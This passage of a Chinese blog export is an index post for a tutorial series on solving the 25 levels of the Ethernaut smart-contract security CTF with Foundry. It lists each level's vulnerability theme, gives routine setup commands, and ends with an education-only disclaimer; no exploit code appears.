文档](https://docs.openzeppelin.com/)**\n\n## 🚨 免责声明\n\n本系列文章纯属教育目的，所有内容仅用于：\n- 学习智能合约安全知识\n- 理解常见漏洞模式\n- 提高代码审计能力\n\n请勿将相关技术用于攻击真实的智能合约或进行任何非法活动。\n\n## 🤝 贡献与反馈\n\n如果你发现任何问题或有改进建议，欢迎：\n- 在 GitHub 提交 Issue\n- 发起 Pull Request\n- 在评论区讨论\n\n---\n\n*让我们一起构建更安全的 Web3 世界！* 🌟","source":"_posts/ethernaut-foundry-solutions-series.md","raw":"---\ntitle: 'Ethernaut Foundry Solutions - 完整系列教程'\ndate: 2025-01-25 14:00:00\nupdated: 2025-01-25 14:00:00\ncategories:\n  - Web3安全\n  - 智能合约\ntags:\n  - Ethernaut\n  - Foundry\n  - 智能合约安全\n  - CTF\n  - Solidity\n  - Web3\n  - 区块链安全\n  - Capture The Flag\nexcerpt: \"深入解析如何使用 Foundry 框架解决 OpenZeppelin Ethernaut CTF 挑战，从基础设置到高级攻击技术的完整指南。\"\n---\n\n# 🛡️ Ethernaut Foundry Solutions - 完整系列教程\n\n> **Ethernaut** 是由 OpenZeppelin 开发的 Web3/Solidity 智能合约安全 CTF（Capture The Flag）游戏，灵感来源于 overthewire.org。每个关卡都是一个智能合约，玩家需要找到漏洞并利用它们来完成挑战。\n\n## 📚 系列介绍\n\n本系列文章详细介绍如何使用 **Foundry** 框架来解决 Ethernaut 的各个挑战。Foundry 是一个现代化的以太坊开发工具套件，提供了强大的测试、部署和调试功能。\n\n### 🎯 学习目标\n\n通过本系列，你将学会：\n\n- ✅ **Foundry 框架的使用**：从安装到高级功能\n- ✅ **智能合约安全审计**：识别常见漏洞模式\n- ✅ **攻击技术实现**：重入攻击、整数溢出、权限提升等\n- ✅ **防御机制设计**：如何编写更安全的智能合约\n- ✅ **CTF 解题思路**：系统化的安全分析方法\n\n## 🏗️ 技术栈\n\n- **Foundry**: 以太坊开发框架\n- **Solidity**: 智能合约编程语言\n- **OpenZeppelin**: 安全合约库\n- **EVM**: 以太坊虚拟机\n\n## 📖 完整关卡列表\n\n### 基础攻击篇 (Level 1-10)\n\n1. **[Level 1: Fallback - 回退函数漏洞](/2025/01/25/ethernaut-level-01-fallback/)**\n   - Fallback 函数权限提升\n   - 最基础的合约攻击\n\n2. **[Level 2: Fallout - 构造函数拼写错误](/2025/01/25/ethernaut-level-02-fallout/)**\n   - 构造函数命名漏洞\n   - 代码审计重要性\n\n3. **[Level 3: Coin Flip - 伪随机数攻击](/2025/01/25/ethernaut-level-03-coinflip/)**\n   - 区块链伪随机数漏洞\n   - 可预测性攻击\n\n4. **[Level 4: Telephone - tx.origin vs msg.sender](/2025/01/25/ethernaut-level-04-telephone/)**\n   - 身份验证绕过\n   - 中间合约攻击\n\n5. **[Level 5: Token - 整数下溢攻击](/2025/01/25/ethernaut-level-05-token/)**\n   - 算术溢出漏洞\n   - SafeMath 的重要性\n\n6. **[Level 6: Delegation - delegatecall 攻击](/2025/01/25/ethernaut-level-06-delegation/)**\n   - delegatecall 存储槽攻击\n   - 上下文切换漏洞\n\n7. **[Level 7: Force - 强制发送以太币](/2025/01/25/ethernaut-level-07-force/)**\n   - selfdestruct 强制转账\n   - 合约余额操控\n\n8. **[Level 8: Vault - 私有变量读取](/2025/01/25/ethernaut-level-08-vault/)**\n   - 区块链数据透明性\n   - 存储槽分析\n\n9. **[Level 9: King - 拒绝服务攻击](/2025/01/25/ethernaut-level-09-king/)**\n   - DoS 攻击模式\n   - 恶意合约阻断\n\n10. **[Level 10: Re-entrancy - 重入攻击](/2025/01/25/ethernaut-level-10-reentrancy/)**\n    - 经典重入攻击\n    - 检查-效果-交互模式\n\n### 进阶攻击篇 (Level 11-20)\n\n11. **[Level 11: Elevator - 接口实现攻击](/2025/01/25/ethernaut-level-11-elevator/)**\n    - 接口恶意实现\n    - 状态变化利用\n\n12. **[Level 12: Privacy - 存储布局分析](/2025/01/25/ethernaut-level-12-privacy/)**\n    - 复杂存储布局\n    - 私有数据提取\n\n13. **[Level 13: Gatekeeper One - 多重验证绕过](/2025/01/25/ethernaut-level-13-gatekeeper-one/)**\n    - Gas 精确控制\n    - 类型转换攻击\n\n14. **[Level 14: Gatekeeper Two - 高级验证绕过](/2025/01/25/ethernaut-level-14-gatekeeper-two/)**\n    - 运行时创建合约\n    - 位运算攻击\n\n15. **[Level 15: Naught Coin - ERC20 授权攻击](/2025/01/25/ethernaut-level-15-naughtcoin/)**\n    - ERC20 transferFrom 绕过\n    - 授权机制漏洞\n\n16. **[Level 16: Preservation - 存储槽劫持](/2025/01/25/ethernaut-level-16-preservation/)**\n    - 存储槽布局攻击\n    - delegatecall 高级利用\n\n17. **[Level 17: Recovery - 合约地址计算](/2025/01/25/ethernaut-level-17-recovery/)**\n    - CREATE 地址预测\n    - 丢失合约恢复\n\n18. **[Level 18: Magic Number - 字节码分析](/2025/01/25/ethernaut-level-18-magicnumber/)**\n    - 手写字节码\n    - EVM 底层原理\n\n19. **[Level 19: Alien Codex - 数组边界攻击](/2025/01/25/ethernaut-level-19-aliencodex/)**\n    - 动态数组下溢\n    - 存储槽任意写入\n\n20. **[Level 20: Denial - Gas 耗尽攻击](/2025/01/25/ethernaut-level-20-denial/)**\n    - 分红合约攻击\n    - Gas 消耗 DoS\n\n### 高级攻击篇 (Level 21-25)\n\n21. **[Level 21: Shop - 视图函数攻击](/2025/01/25/ethernaut-level-21-shop/)**\n    - view 函数状态利用\n    - 价格操控攻击\n\n22. **[Level 22: Dex - DEX 价格操控](/2025/01/25/ethernaut-level-22-dex/)**\n    - AMM 价格计算漏洞\n    - 流动性攻击\n\n23. **[Level 23: Dex Two - 代币注入攻击](/2025/01/25/ethernaut-level-23-dextwo/)**\n    - 恶意代币注入\n    - DEX 安全进阶\n\n24. **[Level 24: Puzzle Wallet - 多重签名钱包攻击](/2025/01/25/ethernaut-level-24-puzzlewallet/)**\n    - 代理模式攻击\n    - 复杂状态管理\n\n25. **[Level 25: Motorbike - UUPS 代理攻击](/2025/01/25/ethernaut-level-25-motorbike/)**\n    - 升级模式漏洞\n    - 实现合约攻击\n\n## 🛠️ 快速开始\n\n```bash\n# 克隆项目\ngit clone https://github.com/XuHugo/Ethernaut-Foundry-Solutions.git\ncd Ethernaut-Foundry-Solutions\n\n# 安装依赖\nforge install\n\n# 运行所有测试\nforge test\n\n# 运行特定关卡测试\nforge test --match-contract FallbackTest -vvv\n```\n\n## 🔗 相关资源\n\n- **[GitHub 项目地址](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**\n- **[Ethernaut 官网](https://ethernaut.openzeppelin.com/)**\n- **[Foundry 官方文档](https://book.getfoundry.sh/)**\n- **[OpenZeppelin 文档](https://docs.openzeppelin.com/)**\n\n## 🚨 免责声明\n\n本系列文章纯属教育目的，所有内容仅用于：\n- 学习智能合约安全知识\n- 理解常见漏洞模式\n- 提高代码审计能力\n\n请勿将相关技术用于攻击真实的智能合约或进行任何非法活动。\n\n## 🤝 贡献与反馈\n\n如果你发现任何问题或有改进建议，欢迎：\n- 在 GitHub 提交 Issue\n- 发起 Pull Request\n- 在评论区讨论\n\n---\n\n*让我们一起构建更安全的 Web3 世界！* 🌟","slug":"ethernaut-foundry-solutions-series","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbot0003bf5q88kh29z4","content":"<h1 id=\"🛡️-Ethernaut-Foundry-Solutions-完整系列教程\"><a href=\"#🛡️-Ethernaut-Foundry-Solutions-完整系列教程\" class=\"headerlink\" title=\"🛡️ Ethernaut Foundry Solutions - 完整系列教程\"></a>🛡️ Ethernaut Foundry Solutions - 完整系列教程</h1><blockquote>\n<p><strong>Ethernaut</strong> 是由 OpenZeppelin 开发的 Web3&#x2F;Solidity 智能合约安全 CTF（Capture The Flag）游戏，灵感来源于 overthewire.org。每个关卡都是一个智能合约，玩家需要找到漏洞并利用它们来完成挑战。</p>\n</blockquote>\n<h2 id=\"📚-系列介绍\"><a href=\"#📚-系列介绍\" class=\"headerlink\" title=\"📚 系列介绍\"></a>📚 系列介绍</h2><p>本系列文章详细介绍如何使用 <strong>Foundry</strong> 框架来解决 Ethernaut 的各个挑战。Foundry 是一个现代化的以太坊开发工具套件，提供了强大的测试、部署和调试功能。</p>\n<h3 id=\"🎯-学习目标\"><a href=\"#🎯-学习目标\" class=\"headerlink\" title=\"🎯 学习目标\"></a>🎯 学习目标</h3><p>通过本系列，你将学会：</p>\n<ul>\n<li>✅ <strong>Foundry 框架的使用</strong>：从安装到高级功能</li>\n<li>✅ <strong>智能合约安全审计</strong>：识别常见漏洞模式</li>\n<li>✅ <strong>攻击技术实现</strong>：重入攻击、整数溢出、权限提升等</li>\n<li>✅ <strong>防御机制设计</strong>：如何编写更安全的智能合约</li>\n<li>✅ <strong>CTF 解题思路</strong>：系统化的安全分析方法</li>\n</ul>\n<h2 id=\"🏗️-技术栈\"><a href=\"#🏗️-技术栈\" class=\"headerlink\" title=\"🏗️ 技术栈\"></a>🏗️ 技术栈</h2><ul>\n<li><strong>Foundry</strong>: 以太坊开发框架</li>\n<li><strong>Solidity</strong>: 智能合约编程语言</li>\n<li><strong>OpenZeppelin</strong>: 安全合约库</li>\n<li><strong>EVM</strong>: 以太坊虚拟机</li>\n</ul>\n<h2 id=\"📖-完整关卡列表\"><a href=\"#📖-完整关卡列表\" class=\"headerlink\" title=\"📖 完整关卡列表\"></a>📖 完整关卡列表</h2><h3 id=\"基础攻击篇-Level-1-10\"><a href=\"#基础攻击篇-Level-1-10\" class=\"headerlink\" title=\"基础攻击篇 (Level 1-10)\"></a>基础攻击篇 (Level 1-10)</h3><ol>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-01-fallback/\">Level 1: Fallback - 回退函数漏洞</a></strong></p>\n<ul>\n<li>Fallback 函数权限提升</li>\n<li>最基础的合约攻击</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-02-fallout/\">Level 2: Fallout - 构造函数拼写错误</a></strong></p>\n<ul>\n<li>构造函数命名漏洞</li>\n<li>代码审计重要性</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-03-coinflip/\">Level 3: Coin Flip - 伪随机数攻击</a></strong></p>\n<ul>\n<li>区块链伪随机数漏洞</li>\n<li>可预测性攻击</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-04-telephone/\">Level 4: Telephone - tx.origin vs msg.sender</a></strong></p>\n<ul>\n<li>身份验证绕过</li>\n<li>中间合约攻击</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-05-token/\">Level 5: Token - 整数下溢攻击</a></strong></p>\n<ul>\n<li>算术溢出漏洞</li>\n<li>SafeMath 的重要性</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-06-delegation/\">Level 6: Delegation - delegatecall 攻击</a></strong></p>\n<ul>\n<li>delegatecall 存储槽攻击</li>\n<li>上下文切换漏洞</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-07-force/\">Level 7: Force - 强制发送以太币</a></strong></p>\n<ul>\n<li>selfdestruct 强制转账</li>\n<li>合约余额操控</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-08-vault/\">Level 8: Vault - 私有变量读取</a></strong></p>\n<ul>\n<li>区块链数据透明性</li>\n<li>存储槽分析</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-09-king/\">Level 9: King - 拒绝服务攻击</a></strong></p>\n<ul>\n<li>DoS 攻击模式</li>\n<li>恶意合约阻断</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-10-reentrancy/\">Level 10: Re-entrancy - 重入攻击</a></strong></p>\n<ul>\n<li>经典重入攻击</li>\n<li>检查-效果-交互模式</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"进阶攻击篇-Level-11-20\"><a href=\"#进阶攻击篇-Level-11-20\" class=\"headerlink\" title=\"进阶攻击篇 (Level 11-20)\"></a>进阶攻击篇 (Level 11-20)</h3><ol start=\"11\">\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-11-elevator/\">Level 11: Elevator - 接口实现攻击</a></strong></p>\n<ul>\n<li>接口恶意实现</li>\n<li>状态变化利用</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-12-privacy/\">Level 12: Privacy - 存储布局分析</a></strong></p>\n<ul>\n<li>复杂存储布局</li>\n<li>私有数据提取</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-13-gatekeeper-one/\">Level 13: Gatekeeper One - 多重验证绕过</a></strong></p>\n<ul>\n<li>Gas 精确控制</li>\n<li>类型转换攻击</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-14-gatekeeper-two/\">Level 14: Gatekeeper Two - 高级验证绕过</a></strong></p>\n<ul>\n<li>运行时创建合约</li>\n<li>位运算攻击</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-15-naughtcoin/\">Level 15: Naught Coin - ERC20 授权攻击</a></strong></p>\n<ul>\n<li>ERC20 transferFrom 绕过</li>\n<li>授权机制漏洞</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-16-preservation/\">Level 16: Preservation - 存储槽劫持</a></strong></p>\n<ul>\n<li>存储槽布局攻击</li>\n<li>delegatecall 高级利用</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-17-recovery/\">Level 17: Recovery - 合约地址计算</a></strong></p>\n<ul>\n<li>CREATE 地址预测</li>\n<li>丢失合约恢复</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-18-magicnumber/\">Level 18: Magic Number - 字节码分析</a></strong></p>\n<ul>\n<li>手写字节码</li>\n<li>EVM 底层原理</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-19-aliencodex/\">Level 19: Alien Codex - 数组边界攻击</a></strong></p>\n<ul>\n<li>动态数组下溢</li>\n<li>存储槽任意写入</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-20-denial/\">Level 20: Denial - Gas 耗尽攻击</a></strong></p>\n<ul>\n<li>分红合约攻击</li>\n<li>Gas 消耗 DoS</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"高级攻击篇-Level-21-25\"><a href=\"#高级攻击篇-Level-21-25\" class=\"headerlink\" title=\"高级攻击篇 (Level 21-25)\"></a>高级攻击篇 (Level 21-25)</h3><ol start=\"21\">\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-21-shop/\">Level 21: Shop - 视图函数攻击</a></strong></p>\n<ul>\n<li>view 函数状态利用</li>\n<li>价格操控攻击</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-22-dex/\">Level 22: Dex - DEX 价格操控</a></strong></p>\n<ul>\n<li>AMM 价格计算漏洞</li>\n<li>流动性攻击</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-23-dextwo/\">Level 23: Dex Two - 代币注入攻击</a></strong></p>\n<ul>\n<li>恶意代币注入</li>\n<li>DEX 安全进阶</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-24-puzzlewallet/\">Level 24: Puzzle Wallet - 多重签名钱包攻击</a></strong></p>\n<ul>\n<li>代理模式攻击</li>\n<li>复杂状态管理</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-25-motorbike/\">Level 25: Motorbike - UUPS 代理攻击</a></strong></p>\n<ul>\n<li>升级模式漏洞</li>\n<li>实现合约攻击</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"🛠️-快速开始\"><a href=\"#🛠️-快速开始\" class=\"headerlink\" title=\"🛠️ 快速开始\"></a>🛠️ 快速开始</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 克隆项目</span></span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/XuHugo/Ethernaut-Foundry-Solutions.git</span><br><span class=\"line\"><span class=\"built_in\">cd</span> Ethernaut-Foundry-Solutions</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装依赖</span></span><br><span class=\"line\">forge install</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 运行所有测试</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 运行特定关卡测试</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --match-contract FallbackTest -vvv</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🔗-相关资源\"><a href=\"#🔗-相关资源\" class=\"headerlink\" title=\"🔗 相关资源\"></a>🔗 相关资源</h2><ul>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub 项目地址</a></strong></li>\n<li><strong><a href=\"https://ethernaut.openzeppelin.com/\">Ethernaut 官网</a></strong></li>\n<li><strong><a href=\"https://book.getfoundry.sh/\">Foundry 官方文档</a></strong></li>\n<li><strong><a href=\"https://docs.openzeppelin.com/\">OpenZeppelin 文档</a></strong></li>\n</ul>\n<h2 id=\"🚨-免责声明\"><a href=\"#🚨-免责声明\" class=\"headerlink\" title=\"🚨 免责声明\"></a>🚨 免责声明</h2><p>本系列文章纯属教育目的，所有内容仅用于：</p>\n<ul>\n<li>学习智能合约安全知识</li>\n<li>理解常见漏洞模式</li>\n<li>提高代码审计能力</li>\n</ul>\n<p>请勿将相关技术用于攻击真实的智能合约或进行任何非法活动。</p>\n<h2 id=\"🤝-贡献与反馈\"><a href=\"#🤝-贡献与反馈\" class=\"headerlink\" title=\"🤝 贡献与反馈\"></a>🤝 贡献与反馈</h2><p>如果你发现任何问题或有改进建议，欢迎：</p>\n<ul>\n<li>在 GitHub 提交 Issue</li>\n<li>发起 Pull Request</li>\n<li>在评论区讨论</li>\n</ul>\n<hr>\n<p><em>让我们一起构建更安全的 Web3 世界！</em> 🌟</p>\n","more":"<h1 id=\"🛡️-Ethernaut-Foundry-Solutions-完整系列教程\"><a href=\"#🛡️-Ethernaut-Foundry-Solutions-完整系列教程\" class=\"headerlink\" title=\"🛡️ Ethernaut Foundry Solutions - 完整系列教程\"></a>🛡️ Ethernaut Foundry Solutions - 完整系列教程</h1><blockquote>\n<p><strong>Ethernaut</strong> 是由 OpenZeppelin 开发的 Web3&#x2F;Solidity 智能合约安全 CTF（Capture The Flag）游戏，灵感来源于 overthewire.org。每个关卡都是一个智能合约，玩家需要找到漏洞并利用它们来完成挑战。</p>\n</blockquote>\n<h2 id=\"📚-系列介绍\"><a href=\"#📚-系列介绍\" class=\"headerlink\" title=\"📚 系列介绍\"></a>📚 系列介绍</h2><p>本系列文章详细介绍如何使用 <strong>Foundry</strong> 框架来解决 Ethernaut 的各个挑战。Foundry 是一个现代化的以太坊开发工具套件，提供了强大的测试、部署和调试功能。</p>\n<h3 id=\"🎯-学习目标\"><a href=\"#🎯-学习目标\" class=\"headerlink\" title=\"🎯 学习目标\"></a>🎯 学习目标</h3><p>通过本系列，你将学会：</p>\n<ul>\n<li>✅ <strong>Foundry 框架的使用</strong>：从安装到高级功能</li>\n<li>✅ <strong>智能合约安全审计</strong>：识别常见漏洞模式</li>\n<li>✅ <strong>攻击技术实现</strong>：重入攻击、整数溢出、权限提升等</li>\n<li>✅ <strong>防御机制设计</strong>：如何编写更安全的智能合约</li>\n<li>✅ <strong>CTF 解题思路</strong>：系统化的安全分析方法</li>\n</ul>\n<h2 id=\"🏗️-技术栈\"><a href=\"#🏗️-技术栈\" class=\"headerlink\" title=\"🏗️ 技术栈\"></a>🏗️ 技术栈</h2><ul>\n<li><strong>Foundry</strong>: 以太坊开发框架</li>\n<li><strong>Solidity</strong>: 智能合约编程语言</li>\n<li><strong>OpenZeppelin</strong>: 安全合约库</li>\n<li><strong>EVM</strong>: 以太坊虚拟机</li>\n</ul>\n<h2 id=\"📖-完整关卡列表\"><a href=\"#📖-完整关卡列表\" class=\"headerlink\" title=\"📖 完整关卡列表\"></a>📖 完整关卡列表</h2><h3 id=\"基础攻击篇-Level-1-10\"><a href=\"#基础攻击篇-Level-1-10\" class=\"headerlink\" title=\"基础攻击篇 (Level 1-10)\"></a>基础攻击篇 (Level 1-10)</h3><ol>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-01-fallback/\">Level 1: Fallback - 回退函数漏洞</a></strong></p>\n<ul>\n<li>Fallback 函数权限提升</li>\n<li>最基础的合约攻击</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-02-fallout/\">Level 2: Fallout - 构造函数拼写错误</a></strong></p>\n<ul>\n<li>构造函数命名漏洞</li>\n<li>代码审计重要性</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-03-coinflip/\">Level 3: Coin Flip - 伪随机数攻击</a></strong></p>\n<ul>\n<li>区块链伪随机数漏洞</li>\n<li>可预测性攻击</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-04-telephone/\">Level 4: Telephone - tx.origin vs msg.sender</a></strong></p>\n<ul>\n<li>身份验证绕过</li>\n<li>中间合约攻击</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-05-token/\">Level 5: Token - 整数下溢攻击</a></strong></p>\n<ul>\n<li>算术溢出漏洞</li>\n<li>SafeMath 的重要性</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-06-delegation/\">Level 6: Delegation - delegatecall 攻击</a></strong></p>\n<ul>\n<li>delegatecall 存储槽攻击</li>\n<li>上下文切换漏洞</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-07-force/\">Level 7: Force - 强制发送以太币</a></strong></p>\n<ul>\n<li>selfdestruct 强制转账</li>\n<li>合约余额操控</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-08-vault/\">Level 8: Vault - 私有变量读取</a></strong></p>\n<ul>\n<li>区块链数据透明性</li>\n<li>存储槽分析</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-09-king/\">Level 9: King - 拒绝服务攻击</a></strong></p>\n<ul>\n<li>DoS 攻击模式</li>\n<li>恶意合约阻断</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-10-reentrancy/\">Level 10: Re-entrancy - 重入攻击</a></strong></p>\n<ul>\n<li>经典重入攻击</li>\n<li>检查-效果-交互模式</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"进阶攻击篇-Level-11-20\"><a href=\"#进阶攻击篇-Level-11-20\" class=\"headerlink\" title=\"进阶攻击篇 (Level 11-20)\"></a>进阶攻击篇 (Level 11-20)</h3><ol start=\"11\">\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-11-elevator/\">Level 11: Elevator - 接口实现攻击</a></strong></p>\n<ul>\n<li>接口恶意实现</li>\n<li>状态变化利用</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-12-privacy/\">Level 12: Privacy - 存储布局分析</a></strong></p>\n<ul>\n<li>复杂存储布局</li>\n<li>私有数据提取</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-13-gatekeeper-one/\">Level 13: Gatekeeper One - 多重验证绕过</a></strong></p>\n<ul>\n<li>Gas 精确控制</li>\n<li>类型转换攻击</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-14-gatekeeper-two/\">Level 14: Gatekeeper Two - 高级验证绕过</a></strong></p>\n<ul>\n<li>运行时创建合约</li>\n<li>位运算攻击</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-15-naughtcoin/\">Level 15: Naught Coin - ERC20 授权攻击</a></strong></p>\n<ul>\n<li>ERC20 transferFrom 绕过</li>\n<li>授权机制漏洞</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-16-preservation/\">Level 16: Preservation - 存储槽劫持</a></strong></p>\n<ul>\n<li>存储槽布局攻击</li>\n<li>delegatecall 高级利用</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-17-recovery/\">Level 17: Recovery - 合约地址计算</a></strong></p>\n<ul>\n<li>CREATE 地址预测</li>\n<li>丢失合约恢复</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-18-magicnumber/\">Level 18: Magic Number - 字节码分析</a></strong></p>\n<ul>\n<li>手写字节码</li>\n<li>EVM 底层原理</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-19-aliencodex/\">Level 19: Alien Codex - 数组边界攻击</a></strong></p>\n<ul>\n<li>动态数组下溢</li>\n<li>存储槽任意写入</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-20-denial/\">Level 20: Denial - Gas 耗尽攻击</a></strong></p>\n<ul>\n<li>分红合约攻击</li>\n<li>Gas 消耗 DoS</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"高级攻击篇-Level-21-25\"><a href=\"#高级攻击篇-Level-21-25\" class=\"headerlink\" title=\"高级攻击篇 (Level 21-25)\"></a>高级攻击篇 (Level 21-25)</h3><ol start=\"21\">\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-21-shop/\">Level 21: Shop - 视图函数攻击</a></strong></p>\n<ul>\n<li>view 函数状态利用</li>\n<li>价格操控攻击</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-22-dex/\">Level 22: Dex - DEX 价格操控</a></strong></p>\n<ul>\n<li>AMM 价格计算漏洞</li>\n<li>流动性攻击</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-23-dextwo/\">Level 23: Dex Two - 代币注入攻击</a></strong></p>\n<ul>\n<li>恶意代币注入</li>\n<li>DEX 安全进阶</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-24-puzzlewallet/\">Level 24: Puzzle Wallet - 多重签名钱包攻击</a></strong></p>\n<ul>\n<li>代理模式攻击</li>\n<li>复杂状态管理</li>\n</ul>\n</li>\n<li><p><strong><a href=\"/2025/01/25/ethernaut-level-25-motorbike/\">Level 25: Motorbike - UUPS 代理攻击</a></strong></p>\n<ul>\n<li>升级模式漏洞</li>\n<li>实现合约攻击</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"🛠️-快速开始\"><a href=\"#🛠️-快速开始\" class=\"headerlink\" title=\"🛠️ 快速开始\"></a>🛠️ 快速开始</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 克隆项目</span></span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/XuHugo/Ethernaut-Foundry-Solutions.git</span><br><span class=\"line\"><span class=\"built_in\">cd</span> Ethernaut-Foundry-Solutions</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装依赖</span></span><br><span class=\"line\">forge install</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 运行所有测试</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 运行特定关卡测试</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --match-contract FallbackTest -vvv</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🔗-相关资源\"><a href=\"#🔗-相关资源\" class=\"headerlink\" title=\"🔗 相关资源\"></a>🔗 相关资源</h2><ul>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub 项目地址</a></strong></li>\n<li><strong><a href=\"https://ethernaut.openzeppelin.com/\">Ethernaut 官网</a></strong></li>\n<li><strong><a href=\"https://book.getfoundry.sh/\">Foundry 官方文档</a></strong></li>\n<li><strong><a href=\"https://docs.openzeppelin.com/\">OpenZeppelin 文档</a></strong></li>\n</ul>\n<h2 id=\"🚨-免责声明\"><a href=\"#🚨-免责声明\" class=\"headerlink\" title=\"🚨 免责声明\"></a>🚨 免责声明</h2><p>本系列文章纯属教育目的，所有内容仅用于：</p>\n<ul>\n<li>学习智能合约安全知识</li>\n<li>理解常见漏洞模式</li>\n<li>提高代码审计能力</li>\n</ul>\n<p>请勿将相关技术用于攻击真实的智能合约或进行任何非法活动。</p>\n<h2 id=\"🤝-贡献与反馈\"><a href=\"#🤝-贡献与反馈\" class=\"headerlink\" title=\"🤝 贡献与反馈\"></a>🤝 